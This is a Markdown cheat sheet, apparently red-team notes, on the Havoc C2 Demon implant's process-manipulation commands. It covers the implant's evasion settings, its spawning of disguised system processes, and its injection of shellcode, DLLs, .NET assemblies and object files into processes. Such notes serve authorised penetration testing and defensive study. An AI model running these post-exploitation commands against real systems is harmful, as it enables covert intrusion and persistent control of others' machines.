# 04 - Process Manipulation

Search Tag(s): #havoc #command-and-control #interactive-shell

## 4.1 - Help Menu

```
Demon » help proc

 - Command       :  proc
 - Description   :  process enumeration and management
 - Usage         :  proc [command]
 - Example       :  proc list

  Command                        Description
  ---------                      -------------
  list                           displays a list of running processes on the target
  kill                           kills the process from specified PID
  blockdll                       block non microsoft signed dlls
  create                         create a process
  modules                        lists loaded modules/dlls from a remote process
  grep                           grep information from the specified remote process
  memory                         query for memory regions
  find-module                    query for processes with specified loaded module
```

## 4.2 - Create Process

```
Demon » proc create notepad.exe

Demon » proc create taskmgr.exe
```

## 4.3 - Terminate Process

```
Demon » proc kill <pid>
```

## 4.4 - Reconfigure Interactive Implant

### 4.4.1 - Help Menu

```
Demon » help config

 - Command       :  config
 - Description   :  configure the behaviour of the demon session
 - Usage         :  config [config.flag]
 - Example       :  config inject.spawn64 C:\Windows\System32\rundll32.exe

  Command                        Description
  ---------                      -------------
  implant.verbose                enable/disable implant verbose logging (process creation, memory allocation, thread execution etc.)
  implant.sleep-obf.start-addr   set custom thread start addr at sleep obfuscation
  implant.sleep-obf.technique    set custom thread start addr at sleep obfuscation
  implant.coffee.veh             enable/disable VEH for object file loading
  implant.coffee.threaded        enable/disable threading while executing object files
  memory.alloc                   memory allocation behaviour
  memory.execute                 memory executing behaviour (remote/local thread)
  inject.spoofaddr               inject code with spoofed thread start addr
  inject.spawn64                 default x64 process to spawn for fork & run operations
  inject.spawn32                 default x86 process to spawn for fork & run operations
```

### 4.4.2 - Configure Spawn Process

Configure a path to spawn new process when executing commands through the demon agent. This will effect other commands like `shellcode` and `dll` to spawn a specific process.

```
Demon » config inject.spawn64 C:\Windows\System32\gpupdate.exe

Demon » config inject.spawn32 C:\Program Files (x86)\Common Files\Java\Java Update\jucheck.exe
```

## 4.5 - Inject Process

### 4.5.1 - Shellcode

Inject shellcode through a process identifier.

```
Demon » shellcode inject <x64 | x86> <pid> /path/to/shellcode.bin
```

Inject shellcode to spawn a new implant.

```
Demon » shellcode spawn <x64 | x86> /path/to/shellcode.bin
```

### 4.5.2 - Spawn DLL

Inject DLL file through a process identifier.

```
Demon » dll inject <pid> /path/to/local/file.dll [arguments]
```

Inject DLL file to spawn a new implant.

```
Demon » dll spawn /path/to/local/file.dll [arguments]
```

### 4.5.3 - DotNET CLR Assembly

Execute .NET files through memory in the current process.

```
Demon » dotnet inline-execute /path/to/local/dotnet_file.exe [arguments]
```

### 4.4.4 - Object File

Execute object file through memory in the current process.

```
Demon » inline-execute /path/to/objectfile.o [arguments]
```